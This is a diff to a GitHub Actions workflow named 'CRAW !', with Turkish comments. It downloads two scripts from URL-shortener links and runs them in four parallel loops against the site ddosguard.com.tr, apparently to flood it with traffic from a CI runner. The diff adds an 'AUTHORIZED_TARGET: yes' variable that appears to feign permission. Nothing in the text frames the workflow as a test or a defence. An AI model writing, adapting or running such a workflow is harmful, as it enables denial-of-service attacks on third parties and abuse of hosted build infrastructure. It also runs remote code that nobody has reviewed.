@@ -2,6 +2,9 @@ name: CRAW !
 on:
   workflow_dispatch:
 
+env:
+  AUTHORIZED_TARGET: yes
+
 jobs:
   vds:
     runs-on: ubuntu-latest
@@ -18,24 +21,38 @@ jobs:
           
       - name: Download scripts
         run: |
-          wget https://curl.by/sSwco/Test.py
-          wget https://curl.by/DT6Ey/testraw.js
+          wget https://curl.by/sSwco/Test.py -O Test.py
+          wget https://curl.by/DT6Ey/testraw.js -O testraw.js
           chmod +x testraw.js Test.py
           
       - name: Run tasks
+        env:
+          AUTHORIZED_TARGET: yes
         run: |
           PIDS=()
+          
+          # 4 paralel döngü
           for i in {1..4}; do
-            timeout 200 python3 Test.py https://ddosguard.com.tr/ &
+            # Python script (200 saniye timeout)
+            timeout 200 python3 Test.py https://ddosguard.com.tr/ --concurrency 2 --rpm 30 --headless &
             PIDS+=($!)
+            
+            # Node.js script (200 saniye timeout)
             timeout 200 node testraw.js https://ddosguard.com.tr/ 666 &
             PIDS+=($!)
+            
+            # Küçük bir gecikme ekle
+            sleep 2
           done
           
-          # Wait for all background processes
+          echo "Başlatılan process sayısı: ${#PIDS[@]}"
+          
+          # Tüm arka plan işlemlerini bekle
           for pid in "${PIDS[@]}"; do
-            wait $pid || true
+            wait $pid 2>/dev/null || true
           done
+          
+          echo "Tüm işlemler tamamlandı"
           
       - name: Additional wait
         run: sleep 200
@@ -43,5 +60,7 @@ jobs:
       - name: Cleanup
         if: always()
         run: |
-          echo "Job completed"
-          # Cleanup operations if needed
+          echo "Job completed at $(date)"
+          # Process'leri temizle
+          pkill -f "Test.py" || true
+          pkill -f "testraw.js" || true
